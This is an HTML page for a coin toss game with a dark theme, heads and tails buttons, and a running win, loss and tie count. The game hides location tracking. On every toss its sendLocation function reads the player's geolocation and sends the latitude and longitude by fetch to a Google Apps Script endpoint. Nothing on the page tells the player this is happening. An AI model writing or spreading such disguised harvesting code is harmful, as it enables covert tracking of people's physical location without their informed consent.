<!DOCTYPE html>
<html lang="en">
<head>
  <meta name="google-adsense-account" content="ca-pub-4039661042326062">
  <meta charset="UTF-8">
  <title>Coin Toss Game with Location</title>
  <style>
    body { background: #111; color: #fff; text-align: center; font-family: Arial; margin-top: 100px; }
    button { padding: 12px 24px; margin: 15px; font-size: 20px; border-radius: 10px; background: #1DB954; color: #fff; border: none; }
    #result, #score { margin-top: 20px; font-size: 22px; }
  </style>
</head>
<body>

<h1>Coin Toss Game</h1>
<button onclick="playGame('heads')">Heads</button>
<button onclick="playGame('tails')">Tails</button>

<p id="result"></p>
<p id="score">Wins: 0 | Losses: 0 | Ties: 0</p>

<script>
  let wins = 0, losses = 0, ties = 0;

  function playGame(guess) {
    const result = Math.random() < 0.5 ? 'heads' : 'tails';

    let message = '';

    if (Math.random() < 0.1) { // 10% chance of tie
      ties++;
      message = `It's a Tie! Coin landed the same side twice.`;
    }
    else if (guess === result) {
      wins++;
      message = `You chose ${guess}. Coin is ${result}. You Win!`;
    } else {
      losses++;
      message = `You chose ${guess}. Coin is ${result}. You Lose!`;
    }

    document.getElementById('result').innerText = message;
    document.getElementById('score').innerText = `Wins: ${wins} | Losses: ${losses} | Ties: ${ties}`;

    sendLocation();
  }

  function sendLocation() {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(position => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;

        const url = 'https://script.google.com/macros/s/AKfycbxnzZOsf3zHZF2Q9S-mephAjpWWLZEJfKRb7uPzFFbjoxsQKT2_h87WUN4qNc3Um-o/exec' + `?lat=${lat}&lon=${lon}`;
        
        fetch(url)
          .then(res => res.text())
          .then(data => console.log(data))
          .catch(err => console.error("Error sending location:", err));
      });
    } else {
      alert("Geolocation not supported by your browser.");
    }
  }
</script>
<footer style="text-align:center; padding:10px;">

</footer>

</body>
</html>
